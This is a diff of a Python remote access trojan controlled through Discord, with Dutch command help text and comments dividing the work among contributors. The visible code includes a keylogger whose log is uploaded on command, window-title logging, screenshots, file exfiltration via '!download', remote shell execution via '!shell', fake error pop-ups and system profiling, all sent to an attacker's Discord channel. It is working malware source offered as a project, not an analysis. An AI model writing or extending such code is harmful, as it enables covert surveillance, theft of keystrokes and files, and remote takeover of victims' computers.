@@ -39,8 +39,6 @@ Lijst me commands:
 --> !exit = Programma afsluiten
 --> !kill = Beëindig de sessie of alle sessies behalve de huidige / Syntaxis = "!kill session-3" of "!kill all"
 """
-
-
 async def activity(client):
     import time
     import win32gui
@@ -53,13 +51,11 @@ async def activity(client):
         await client.change_presence(status=discord.Status.online, activity=game)
         time.sleep(1)
 
-
 def between_callback(client):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(activity(client))
     loop.close()
-
 
 @client.event
 async def on_ready():
@@ -104,7 +100,6 @@ async def on_ready():
     game = discord.Game(f"Window logging gestopt")
     await client.change_presence(status=discord.Status.online, activity=game)
 
-
 @client.event
 async def on_message(message):
     if message.channel.name != channel_name:
@@ -126,7 +121,7 @@ async def on_message(message):
                 except:
                     await message.channel.send(
                         f"[!] {message.content[6:]} is invalid,please enter a valid session name")
-
+        
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
@@ -137,7 +132,9 @@ async def on_message(message):
 
         if message.content == "!exit":
             exit()
-
+            
+ # tot hier dani . ahmet hier beginnen 
+            
         if message.content == "!windowstart":
             import threading
             global stop_threads
@@ -152,7 +149,7 @@ async def on_message(message):
             await message.channel.send("[*] Window logging voor deze sessie gestopt")
             game = discord.Game(f"Window logging gestopt")
             await client.change_presence(status=discord.Status.online, activity=game)
-        # ahmet tot 256
+        
         if message.content == "!screenshot":
             import os
             from mss import mss
@@ -194,7 +191,6 @@ async def on_message(message):
             def mess():
                 ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Eror",
                                                  MB_HELP | MB_YESNO | ICON_STOP)  # Show message box
-
             import threading
             messa = threading.Thread(target=mess)
             messa._running = True
@@ -214,7 +210,7 @@ async def on_message(message):
         if message.content.startswith("!download"):
             file = discord.File(message.content[10:], filename=message.content[10:])
             await message.channel.send("[*] Command successfully executed", file=file)
-
+          
         if message.content.startswith("!shell"):
             global status
             import time
@@ -229,7 +225,7 @@ async def on_message(message):
                 global status
                 status = "ok"
                 return output
-
+            
             import threading
             shel = threading.Thread(
                 target=shell)  # Use of threading and a global variable to avoid hanging if command is too long to produce an output (probably a better way to do this)
@@ -256,11 +252,10 @@ async def on_message(message):
             else:
                 await message.channel.send("[*] Opdracht niet herkend of geen uitvoer verkregen")
                 status = None
-        # moustafa eind
+        # tot hier ahmet. hier beginnen moustafa
 
         if message.content == "!help":
             await message.channel.send(helpmenu)
-
 
         if message.content == "!sysinfo":
             import platform
@@ -294,7 +289,7 @@ async def on_message(message):
             temp = os.getenv("TEMP")
             logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                 level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
+            
             def keylog():
                 def on_press(key):
                     logging.info(str(key))
@@ -310,11 +305,13 @@ async def on_message(message):
             test.start()
             await message.channel.send("[*] Keylogger succesvol gestart")
 
+            
         if message.content == "!stopkeylogger":
             import os
             test._running = False
             await message.channel.send("[*] Keylogger succesvol gestopt")
 
+            
         if message.content == "!idletime":
             class LASTINPUTINFO(Structure):
                 _fields_ = [
@@ -342,5 +339,6 @@ async def on_message(message):
             import time
             time.sleep(1)
 
-
+            
+            
 client.run(token)
